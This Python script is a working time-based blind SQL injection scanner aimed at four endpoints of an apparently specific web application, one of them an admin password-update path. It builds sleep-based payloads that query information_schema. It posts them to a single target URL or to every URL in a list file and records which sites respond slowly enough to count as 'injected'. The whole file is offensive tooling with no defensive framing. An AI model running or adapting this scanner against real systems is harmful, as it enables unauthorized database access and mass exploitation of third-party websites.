import argparse
import requests
import time


def send_post_request(url, payload,success_results):
    try:
        custom_headers = {"Content-Type": "application/x-www-form-urlencoded"}
        default_headers = requests.post(url, data=payload).headers
        headers = default_headers.copy()
        headers.update(custom_headers)
        start_time = time.time()      
        response = requests.post(url, data=payload,headers=headers)
        end_time = time.time()
        elapsed_time = end_time - start_time
        if response.status_code == 200 and elapsed_time > 6:
            print(f"{url}success inject!")
            success_results.append(f"{url} injected!")
        else:
            print(f"{url} failed status {response.status_code} --sqlError OR waf")
    except Exception as e:
        print(f"Url cannot be accessed")

def main():
    parser = argparse.ArgumentParser(description="Send POST requests to specified URLs.")
    parser.add_argument("-u", "--url", dest="target_url", required=False, help="Target URL")
    parser.add_argument("-l", "--list", dest="url_list_file", help="File containing URLs")

    args = parser.parse_args()

    target_subdirectories = [
        "/Admin/Home/CT_SysAdminUpdatePwd_new",
        "/Website/home/CT_GetNewsInfo",
        "/Website/home/CT_GetNewsInfo",
        "/Website/home/CT_GetReMenNewsList"
    ]

    success_results = []

    target_urls = []

    if args.url_list_file:
        with open(args.url_list_file, "r") as file:
            target_urls = [line.strip() for line in file.readlines()]
    else:
        target_urls = [args.target_url]
    

    sql_payloads = {"code": "0'XOR(if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0))XOR'Z",
                    "GetNewsInfo_leaveId":"if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)",
                    "text":"0'XOR(if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0))XOR'Z",
                    "GetReMenNewsList_leaveId":"if(ascii(substr((select%20table_name%0afrom%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),1,1))>0%2Csleep(6)%2C0)"
                    }
        
    payloads = [
        "LginPwdstr=%5C147%5C60%5C60%5C144%5C120%5C141%5C44%5C44%5C167%5C60%5C162%5C104&code={code}&oldpwd=%5C147%5C60%5C60%5C144%5C120%5C141%5C44%5C44%5C167%5C60%5C162%5C104",
        "leaveId={GetNewsInfo_leaveId}&pageIndex=1&pageSize=6&text=",
        "leaveId=52&pageIndex=1&pageSize=6&text={text}",
        "leaveId={GetReMenNewsList_leaveId}&pageIndex=1&pageSize=5&queryType=0"
    ]

    for url in target_urls:
            for i,post in enumerate(payloads):
                payload = post.format(**sql_payloads)
                subdirectory = target_subdirectories[i]
                full_url = url + subdirectory
                send_post_request(full_url, payload,success_results)

    print("\nsuccessful injections list:")
    for result in success_results:
        print(result)

if __name__ == "__main__":
    main()
